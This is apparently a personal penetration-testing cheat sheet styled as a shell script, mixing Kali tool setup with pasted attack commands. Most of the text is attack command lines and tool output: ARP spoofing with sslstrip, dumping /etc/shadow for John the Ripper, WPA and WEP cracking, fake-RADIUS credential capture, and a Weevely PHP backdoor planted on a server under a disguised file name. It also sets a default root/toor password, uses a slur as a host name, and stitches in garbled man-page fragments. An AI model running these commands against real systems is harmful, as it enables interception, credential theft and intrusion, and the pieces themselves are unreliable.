#!/bin/bash
## VulnSlopHole.sh




##### Installing OpenVAS
if [ "$openVAS" != "false" ]; then
  echo -e "\n $GREEN[+]$RESET Installing OpenVAS ~ vulnerability scanner"
  apt-get -y -qq install openvas
  openvas-setup
  #--- Bug fix (target credentials creation)
  mkdir -p /var/lib/openvas/gnupg/
  #--- Bug fix (keys)
  curl --progress -k -L "http://www.openvas.org/OpenVAS_TI.asc" | gpg --import -
  #--- Bug fix (Timeout - https://bugs.kali.org/view.php?id=2340)
  file=/etc/init.d/openvas-manager;   #[ -e "$file" ] && cp -n $file{,.bkup}
  sed -i 's/^DODTIME=.*/DODTIME=25/' $file
  #--- Make sure all services are correct
  #openvas-start   #service openvas-manager restart; service openvas-scanner restart; service greenbone-security-assistant restart
  #--- User control
  username="root"
  password="toor"
  (openvasmd --get-users | grep -q ^admin$) && echo -n 'admin user: ' && openvasmd --delete-user=admin
  (openvasmd --get-users | grep -q "^${username}$") || (echo -n "$username user: "; openvasmd --create-user="$username"; openvasmd --user="$username" --new-password="$password" >/dev/null)   # You will want to alter it to something (much) more secure!
  echo -e " $YELLOW[i]$RESET OpenVAS username: $username"
  echo -e " $YELLOW[i]$RESET OpenVAS password: $password   *** CHANGE THIS ASAP.   Run: # openvasmd --user=root --new-password='<NEW_PASSWORD>'"
  #--- Check
  openvas-check-setup
  #--- Remove from start up
  update-rc.d -f openvas-manager remove
  update-rc.d -f openvas-scanner remove
  update-rc.d -f greenbone-security-assistant remove
  #--- Setup alias
  file=/root/.bash_aliases; [ -e "$file" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
  grep -q '^## openvas' "$file" 2>/dev/null || echo -e '## openvas\nalias openvas="service openvas-manager restart; service openvas-scanner restart; service greenbone-security-assistant restart; xdg-open https://127.0.0.1:9392/"\n' >> "$file"
else
  echo -e ' '$RED'[!]'$RESET' Skipping OpenVAS (missing --openvas)...' 1>&2
fi

















###### Installing nessus    #*** Doesn't automate
#echo -e "\n $GREEN[+]$RESET Installing nessus ~ vulnerability scanner"
#--- Get download link
#xdg-open http://www.tenable.com/products/nessus/select-your-operating-system    *** #wget -q "http://downloads.nessus.org/<file>" -O /usr/local/src/nessus.deb   #***!!! Hardcoded version value
#dpkg -i /usr/local/src/Nessus-*-debian6_*.deb
#service nessusd start
#xdg-open http://www.tenable.com/products/nessus-home
#/opt/nessus/sbin/nessus-adduser   #*** Doesn't automate
##rm -f /usr/local/src/Nessus-*-debian6_*.deb
#--- Check email
#/opt/nessus/sbin/nessuscli fetch --register <key>   #*** Doesn't automate
#/opt/nessus/sbin/nessusd -R
#/opt/nessus/sbin/nessus-service -D
#xdg-open https://127.0.0.1:8834/
#--- Remove from start up
#update-rc.d -f nessusd remove


###### Installing Nexpose    #*** Doesn't automate
#/opt/rapid7/nexpose/nsc/nsc.sh
#--- Remove from start up
#update-rc.d -f nexposeconsole.rc remove













##### Configuring Burp Proxy
if [ "$burpFree" != "false" ]; then
  echo -e "\n $GREEN[+]$RESET Configuring Burp Proxy ~ web application proxy"
  apt-get -y -qq install burpsuite curl
  mkdir -p /root/.java/.userPrefs/burp/
  file=/root/.java/.userPrefs/burp/prefs.xml;   #[ -e "$file" ] && cp -n $file{,.bkup}
  [ -e "$file" ] || cat <<EOF > "$file"
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE map SYSTEM "http://java.sun.com/dtd/preferences.dtd" >
<map MAP_XML_VERSION="1.0">
  <entry key="eulafree" value="2"/>
  <entry key="free.suite.feedbackReportingEnabled" value="false"/>
</map>
EOF
  #--- Extract CA
  find /tmp/ -maxdepth 1 -name 'burp*.tmp' -delete
  export DISPLAY=:0.0   #[[ -z $SSH_CONNECTION ]] || export DISPLAY=:0.0
  timeout 120 burpsuite &
  PID=$!
  sleep 15
  #echo "-----BEGIN CERTIFICATE-----" > /tmp/PortSwiggerCA && awk -F '"' '/caCert/ {print $4}' /root/.java/.userPrefs/burp/prefs.xml | fold -w 64 >> /tmp/PortSwiggerCA && echo "-----END CERTIFICATE-----" >> /tmp/PortSwiggerCA
  export http_proxy="http://127.0.0.1:8080"
  rm -f /tmp/burp.crt
  while test -d /proc/$PID; do
    sleep 1
    curl --progress -k -L "http://burp/cert" -o /tmp/burp.crt 2>/dev/null
    [ -f /tmp/burp.crt ] && break
  done
  timeout 5 kill $PID 2>/dev/null
  unset http_proxy
  #--- Installing CA
  if [ -f /tmp/burp.crt ]; then
    apt-get -y -qq install libnss3-tools
    folder=$(find /root/.mozilla/firefox/ -maxdepth 1 -type d -name '*.default' -print -quit)
    certutil -A -n Burp -t "CT,c,c" -d "$folder" -i /tmp/burp.crt
    timeout 15 iceweasel
    #mkdir -p /usr/share/ca-certificates/burp/
    #cp -f /tmp/burp.crt /usr/share/ca-certificates/burp/
    #dpkg-reconfigure ca-certificates
    #cp -f /tmp/burp.crt /root/Desktop/burp.crt
  else
    echo -e ' '$RED'[!]'$RESET' Didnt extract burp suite Certificate Authority (CA). Skipping...' 1>&2
  fi
  #--- Remove old temp files
  sleep 1
  find /tmp/ -maxdepth 1 -name 'burp*.tmp' -delete
  find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'sessionstore.*' -delete
  rm -f /tmp/burp.crt
  unset http_proxy
else
  echo -e ' '$RED'[!]'$RESET' Skipping Burp (missing --burp)...' 1>&2
fi






 # Install Burp CA on device Grab Burp CA Change extension from .der to .crt push certificate to /storage/sdcard Import from SDCARD via settings




#--- Setup hardware database
mkdir -p /etc/aircrack-ng/
airodump-ng-oui-update 2>/dev/null || curl --progress -k -L "http://standards.ieee.org/develop/regauth/oui/oui.txt" > /etc/aircrack-ng/oui.txt          #***!!! hardcoded path!
[ -e /etc/aircrack-ng/oui.txt ] && (\grep "(hex)" /etc/aircrack-ng/oui.txt | sed 's/^[ \t]*//g;s/[ \t]*$//g' > /etc/aircrack-ng/airodump-ng-oui.txt)
#--- Setup alias
file=/root/.bash_aliases; [ -e "$file" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "$file" && "$(tail -c 1 $file)" != "" ]]) && echo >> "$file"
grep -q '^## aircrack-ng' "$file" 2>/dev/null || echo -e '## aircrack-ng\nalias aircrack-ng="aircrack-ng -z"\n' >> "$file"
grep -q '^## airodump-ng' "$file" 2>/dev/null || echo -e '## airodump-ng \nalias airodump-ng="airodump-ng --manufacturer --wps --uptime"\n' >> "$file"    # aircrack-ng 1.2 rc2









##### Installing vulscan script for nmap
echo -e "\n $GREEN[+]$RESET Installing vulscan script for nmap ~ vulnerability scanner add-on"
apt-get -y -qq install nmap curl
mkdir -p /usr/share/nmap/scripts/vulscan/
curl --progress -k -L "http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz" > /tmp/nmap_nse_vulscan.tar.gz    #***!!! hardcoded version! Need to manually check for updates
gunzip /tmp/nmap_nse_vulscan.tar.gz
tar -xf /tmp/nmap_nse_vulscan.tar -C /usr/share/nmap/scripts/
#--- Fix permissions (by default its 0777)
chmod -R 0755 /usr/share/nmap/scripts/; find /usr/share/nmap/scripts/ -type f -exec chmod 0644 {} \;
#--- Remove old temp files
rm -f /tmp/nmap_nse_vulscan.tar*








###### Installing ropeme (https://bugs.kali.org/view.php?id=2328)
echo -e "\n $GREEN[+]$RESET Installing ropeme ~ generate ROP gadgets and payload"
apt-get -y -qq install git python-distorm3 libdistorm64-1 libdistorm64-dev binutils
git clone git://github.com/packz/ropeme.git /usr/share/ropeme-git/
pushd /usr/share/ropeme-git/ >/dev/null
git reset --hard HEAD
git pull
sed -i 's/distorm/distorm3/g' ropeme/gadgets.py
popd >/dev/null
#--- Add to path
file=/usr/local/bin/ropeme-git
cat <<EOF > "$file"
#!/bin/bash

cd /usr/share/ropeme-git/ && python ropeme/ropshell.py "\$@"
EOF
chmod +x "$file"
















$ nmap —script/usr/share/nmap/scripts/banner-plus.nse –min-rate=400 —min-parallelism=512 -p1-
65535 -n -Pn -PS -oA/opt/peepingtom/report <IP CIDR>


## ------------------------------------------ ##
##   [?] Pipe an IP address list into NMap
## ------------------------------------------ ##
cat $IPList.txt | xargs -n1 nmap -sV








echo "Gnmap.pl is a Perl script that will take the results from the prior Nmap "
echo "and clean it to a list of IPs.4 We can do this by the following commands."


$ cd/opt/peepingtom/
$ cat report.gnmap | ./gnmap.pl | grep http | cut -f 1,2 -d “,”| tr “,” “:” > http_ips.txt


echo "The output will be a file called http_ips.txt "
echo "with a full list of IPs running http services. We can now"
echo "feed that into Peeping Tom to start screen grabbing. To run Peeping Tom:"


$ python ./peepingtom.py -p -i http_ips.txt

echo "The example below demonstrates running the tool against an output from our previous Nmap scan."
echo "Note that some http services can’t be captured and will have to be visited manually."



$ python ./peepingtom.py -p -i http_ips.txt
[*] Storing data in ‘131229_230336/’
[*] http://192.168.58.20 200. Good.
[*] https://192.168.58.20 200. Good.
[*] http://192.168.58.21 403. Good.
[*] https://192.168.58.21 <Connection refused>. Visit manually from report.
[*] http://192.168.58.25 <No route to host>. Visit manually from report.
[*] https://192.168.58.25 <No route to host>. Visit manually from report
[*] http://192.168.58.35 <Connection refused>. Visit manually from report.
[*] http://192.168.58.48 200. Good.
[*] https://192.168.58.48 200. Good.












openvas-adduser

openvasad --enable-modify-settings -c set_role -u poopster -r Admin

echo -e "\t\tOpenVAS web UI:"
echo -e "\t\t\thttp://127.0.0.1:9392/login/login.html"





The basic ARP spoof command is:
ettercap -TqM arp: remote/10.0.1.1//10.0.1.7/

gedit /etc/etter.conf


echo "ensure the second line of iptables in etter.conf is not commented out:"

#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"


iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -a -k -f


ettercap -T -q -i wlan0 -M arp:remote /192.168.11.120/ /192.168.11.1/
echo “1” >/proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp —destination-port 80 -j REDIRECT —to-port 1000
sslstrip -f -a -k -l 1000 -w/root/out.txt &
arpspoof -i eth0 [gateway]
ferret -i eth0
hamster



unshadow /etc/passwd /etc/shadow > /home/poopster/password.db

cat /home/poopster/password.db

john /home/poopster/password.db

john --show /home/poopster/password.db

# crack standard MD5 hashes
john -format=raw-md5 -pot=./list.pot md5list.txt


##   [+] john the ripper - Use md5list.txt file for MD5 hashes

write any cracked passwords into the file list.pot.
john —format=raw-md5 —pot=./list.pot md5list.txt

If you are using the JtR Jumbo pack and want to take advantage of GPU processing:
john —format=raw-md5-opencl —wordlist=./Wordlists/all.lst —rules: Single md5list.txt



cudaHashcat-plus64.exe -m 2500 out.hccap list\rockyou.txt


###################################################################################################
###################################################################################################




Quick scan:"
golismero.py scan TARGET
golismero.py scan 10.0.0.0/24 172.16.0.0/24 TARGET

List available profiles:"
golismero.py profiles

Custom plugins setup:"
golismero.py scan -e spider -e plecost -e dns* TARGET

Plugin parameters:"
golismero.py scan -a openvas:port=9182 -a openvas:user=tor TARGET
golismero.py scan -a openvas:profile=“My new profile” TARGET

Audit name and results database:"
golismero.py scan --audit-name my_audit -db my_database.db TARGET

Without database and increasing debug level:"
golismero.py scan -nd -vv TARGET

Setting proxy:"
golismero.py scan -pu USER -pp PASS -pa ADDRESS -pn PORT TARGET

Following redirects (or only one) and set max depth crawling:"
golismero.py scan --follow-redirects --depth 2 TARGET
golismero.py scan --follow-first --depth 4 TARGET

Performance and networks options:"
golismero.py scan --max-concurrent 10 --max-connections 25 TARGET

Set scope and limits:"
golismero.py scan --max-links 95 --allow-subdomains --parent TARGET
golismero.py scan --forbid-subdomains --no-parent TARGET

Session management:"
golismero.py scan --cookie “COOKIE_VAL” --user-agent random TARGET
golismero.py scan --cookie-file FILE_PATH.jar TARGET

Set profile:"
golismero.py scan --profile quick TARGET




###################################################################################################
###################################################################################################

# place weevely backdoor on the target server:

$ Weevely generate letmein

[generate.php] Backdoor file 'Weevely.php' created with password
'letmein'

$ mv Weevely.php wp-configs .php


$ Weevely http://example.com/wp-configs.php letmein



Weevely has numerous modules. To show the
modules, all we have to do is type : followed by pressing the Tab key twice. The
following result will be displayed:

@example01:/var/www/html/example.com $ :
:audit.etcpasswd :file.ls :generate.php
:audit.mapwebfiles :file.mount :help
:audit.phpconf :file.read :load
:audit.systemfiles :file.rm :net.ifaces

:audit.userfiles :file.touch :net.phpproxy
:backdoor.reversetcp :file.upload :net.proxy
:backdoor.tcp :file.upload2web :net.scan
:bruteforce.sql :file.webdownload :set
:bruteforce.sqlusers :find.name :shell.php
:file.check :find.perms :shell.sh
:file.download :find.suidsgid :sql.console
:file.edit :generate.htaccess :sql.dump
:file.enum :generate.img :system.info



We will start with the system files (using the systemfiles option) as follows:
@example01:/var/www/html/example.com $ :help systemfiles
[audit.systemfiles] Find wrong system files permissions
usage: :audit.systemfiles [-h]
[{etc_readable,etc_writable,crons,homes,logs,binslibs,root,all}]

@example01:/var/www/html/example.com $:audit.systemfiles


$ cat wp-config.php |grep DB_

@example01:/var/www/html/example.com $ ls /etc/httpd/
conf
conf.d
logs
modules
run
@example01:/var/www/html/example.com $ ls /etc/httpd/conf.d/
README
manual.conf
perl.conf
php.conf
phpMyAdmin.conf-old
phpmyadmin.conf
phpmyadmin.conf.rpmsave
proxy_ajp.conf
python.conf
squid.conf
ssl.conf
wagerlogic.com.conf
webalizer.conf
welcome.conf
@example01:/var/www/html/example.com $ ls /etc/httpd/conf/
httpd.conf
magic


@example01:/var/www/html/example.com $ :file.edit -editor vi /etc/httpd/
conf/httpd.conf

Gathering full system information:
@example01:/var/www/html/example.com $ :help system.info

@example01:/var/www/html/example.com $ :system.info

###################################################################################################
###################################################################################################
WPA Enterprise - Fake Radius Attack


## We need to next patch our Radius server:
$ patch -p1 < freeradius-wpe-2.1.12.patch
$ ./configure && make && make install

## We need to edit the configurations:
 cat >> clients.conf <<EOF
 client 192.168.1.1 {
 secret = mysecret
 }
EOF


$ radiusd -X
In a separate terminal:
$ tail -f/usr/local/var/log/radius/freeradius-server-wpe.log
## Example Output:
## username: admin
## challenge: 07:50:2a:b7:a6:4d:24:d1
## response: fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08
## mschap: Sat Jun 8 23:02:39 2013
## username: user1
## challenge: 34:ab:f0:95:62:52:85:40
## response: 9e:0c:e7:80:06:2f:a0:0b:c3:d7:c7:d7:c6:38:ec:0a:e5:a3:57:8c:33:2c:8e:0f
## mschap: Sat Jun 8 23:28:43 2013
## username: test
## challenge: 12:ea:f1:24:f5:4b:e8:7e
## response: be:17:da:45:c0:88:ed:9c:eb:c9:5c:38:b8:1f:3e:8f:90:cd:17:16:ad:87:b3:ed


genkeys -r darkc0de.lst -f words.dat -n words.idx


asleap -f words.dat -n words.idx -C 07:50:2a 7:a6:4d: 24: d1 -R fc:9d:19:06:
c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05: 19:c4:5d:26:30:08

###################################################################################################
###################################################################################################




Automater is an automated tool to give some basic information
about the target. 


$ automater -t www.example.com


###################################################################################################
###################################################################################################

information on the targeted system is clear. This includes the country
location, the web server (in this case, it is Microsoft) the PHP version, the IP address,
the authors name, and most importantly the CMS type

whatweb example.com




create our own workspace:


sudo recon-ng -w poopster

recon-ng > show modules

recon-ng > load recon/hosts/gather/http/web/google_site

recon-ng [google_site] > info

recon-ng [google_site] > set domain example.com
DOMAIN => example.com
recon-ng [google_site] > run

[*] URL: http://www.google.com/search?start=0&filter=0&q=site%3Aexample.
com
[*] www.example.com
[*] Sleeping to avoid lockout...
[*] URL: http://www.google.com/search?start=0&filter=0&q=site%3Aexample.
com+-site%3Awww.example.com
[*] career.example.com
[*] ice2013.example.com
[*] Sleeping to avoid lockout...
[*] URL: http://www.google.com/search?start=0&filter=0&q=site%3Aexample.
com+-site%3Awww.example.com+-site%3Acareer.example.com+-site%3Aice2013.
example.com
[*] 3 total hosts found.
[*] 3 NEW hosts found!


use SQL commands with the usage of the query command as follows:

recon-ng [google_site] > query select * from hosts




This module uses ARIN Whois RWS to harvest POC data from the whois queries for the given domain:

load recon/contacts/gather/http/api/whois_pocs
recon-ng [whois_pocs] > info

recon-ng [whois_pocs] > set domain example.com

DOMAIN => example.com
recon-ng [whois_pocs] > run
[*] URL: http://whois.arin.net/rest/pocs;domain=example.com
[*] URL: http://whois.arin.net/rest/poc/AADLA-ARIN
[*] JOHN
States)
RIPPER (jtr@example.com) - Whois contact (Seattle, WA - United
[*] URL: http://whois.arin.net/rest/poc/AADLA1-ARIN
[*] BRUTE FORCE(bf@example.com) - Whois contact (Murray, UT - United
States)
[*] URL: http://whois.arin.net/rest/poc/ABUSE231-ARIN


Recon-ng is its ability to report all the information
and entries stored in its database


load the
reporting module and select the format. The tool offers two different formats, .csv
and .html, by setting the company/target name. So, we go ahead as follows:



recon-ng > load reporting/html_report
recon-ng [html_report] > set company example.com
recon-ng [html_report] > set

Usage: set <option> <value>
Name 		Current Value 				Req 	Description
-------- 	------------- 				--- 	-----------
COMPANY 	example.com 				yes	name for report header

FILENAME 	./workspaces/backbox/results.html	yes	path and filename for report output

  SANITIZE True


recon-ng [html_report] > run


###################################################################################################
###################################################################################################

# quick query for Joomla we currently have 906 different vulnerabilities

cat/usr/share/exploitdb/platforms/php/webapps/22153.pl


## ------------------------------------------------- ##
##   [+] Xprobe2 OS fingerprinting
## ------------------------------------------------- ##
##   [?] fuzzy signature matching to provide
##       the probable operating system assessment
## ------------------------------------------------- ##
xprobe2 $IP

xprobe2 -v -p tcp:80:open $IP
xprobe2 -v -p tcp:80:open 192.168.6.66




## ---------------------------------------------------------------------- ##
##   [?] If TCP port 139 is open, enable application level SMB module
## ---------------------------------------------------------------------- ##
xprobe2 -p tcp:139:open 192.168.1.2


##-========================================-##
##   [+] Xprobe2 - Portscanning Module
##-========================================-##
xprobe2 -T 1-1024 127.0.0.1


## ----------------------------------------------------------------- ##
##   [?] TCP handshake module - Trys to blindly guess open ports
## ----------------------------------------------------------------- ##
xprobe2 -B 192.168.1.1



##-=========================================-##
##   [+] TCP handshake Module (Number 11) 
##-=========================================-##
## -------------------------------------------------------- ##
##   [?] very usefull when all ICMP traffic is filtered
## -------------------------------------------------------- ##
xprobe2 -M 11 -p tcp:80:open 192.168.1.1


## ------------------------------------------ ##
##   [?] Launch an OS Fingerprint Attempt
## ------------------------------------------ ##
xprobe2 -v -p udp:53:closed 192.168.1.20


## ---------------------------------------------------- ##
##   [?] Launch OS Fingerprinting Modules 1 & 2
##   [?] Module 1 & 2 Are Reachability Tests:
## ---------------------------------------------------- ##
xprobe2 -v -D 1 -D 2 192.168.1.10
-v     be verbose.

       -r     display route to target

-o
-F     generate signature for specified target
-X     write XML output to logfile










driftnet -v -b -i wlan0 -d <directory>

 -f <file>


stty(1), pcap(3PCAP), bpf(4), nit(4P),  pcap-savefile(5),  pcap-filter(7),  pcap-tstamp-type
tcpslice(1), pcap-filter(7), pfconfig(8), usermod(1M) autoconf
gmdb2(1)   mdb-export(1)  mdb-prop(1)  mdb-sql(1)  mdb-ver(1)  mdb-array(1)  mdb-
       header(1) mdb-parsecsv(1) mdb-schema(1) mdb-tables


you can inject packets onto a network with a
       pcap_t  for  a  live capture, using pcap_inject() or pcap_sendpacket()






To record all packets arriving at or departing from faggot:
tcpflow host faggot

To record traffic between helios and either hot or ace:
tcpflow host helios and \( hot or ace \)

To record traffic between ace and any host except helios:
tcpflow host ace and not helios

To record all traffic between local hosts and hosts at Berkeley:
tcpflow net ucb-ether

To record all ftp traffic through internet gateway snup: (note that the expres‐
sion is quoted to prevent the shell from (mis-)interpreting the parentheses):
tcpflow 'gateway snup and (port ftp or ftp-data)'

catch only unfragmented datagrams and frag zero of fragmented datagrams. 

`ip[6:2] & 0x1fff = 0'


catch all multicast traffic
`ether[0] & 1 != 0' 











-A   		  Map  applications
-B   		  Just grab banners
-W			  application fingerprints and triggers updated from thc.org
-u   		  Ports specified on commandline are UDP

-6   		  Use IPv6, not IPv4
-1   		  Only send triggers to a port until 1st identification
-v   		  Verbose
-q   		  Quiet all  closed  and timed out ports are NOT marked as unidentified and are not reported at all.
-d   		  hexdump of all received responses.
-b   		  Print ACSII banners (if one is received).
-o <file>	  Log the output of amap to <file>. (Modes: Amap, Banner, Portscan)
-m <file>	  Make  the  log file output
-p <proto>	  This specifies a single protocol trigger to send
-S   		  Do NOT NOT look behind an SSL port 				# Otherwise amap will reconnect later to identify the service running behind the ssl wrapper.
-R			  Do NOT identify RPC service (err multiconnect)
-c n  		  Open 'n' parallel tasks (connections). 
-T n  		  wait upto 'n' seconds for a successful TCP connect.
-H    		  Skip  potentially  harmful  triggers.
	



TCP portscan module to report/display output of filtered ports


this scan is used on a host that has a firewall 
and/or has filtered ports which can slow down a scan
dmitry -t

TCP portscan module to output banners
dmitry -pb target

dmitry -o $File       ## Create  an ascii text output of the results


dmitry -winseo target


DMitry  (Deepmagic Information Gathering Tool)

dmitry -n $Domain       ## Retrieve  netcraft.com  data
dmitry -i $IP           ## Internet Number whois lookup
dmitry -w $Domain       ## Perform a whois lookup on the host target.
dmitry -p $Domain       ## Perform a TCP portscan on the host target
dmitry -s $Domain       ## Perform a subdomain search
dmitry -o $File $Domain ## Create  an ascii text output of the results









##############################################################################################################

# aireplay-ng --arpreplay -e (victim_access_point) -b (access_point_mac) $monitor
# aireplay-ng --chopchop -F -h (attacker_mac) $monitor
# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w chop_chop.cap

# aireplay-ng --interactive -F -r /tmp/chop_chop.cap $monitor
# aireplay-ng --fragment -F -b (access_point_mac) -h (attacker_mac) $monitor
# packetforge-ng -0 -a (access_point_mac) -h (attacker_mac) -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w fragmented.cap

##############################################################################################################



aircrack-ng -a 2 --bssid $BSSID *.cap -w $wordlist


kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null






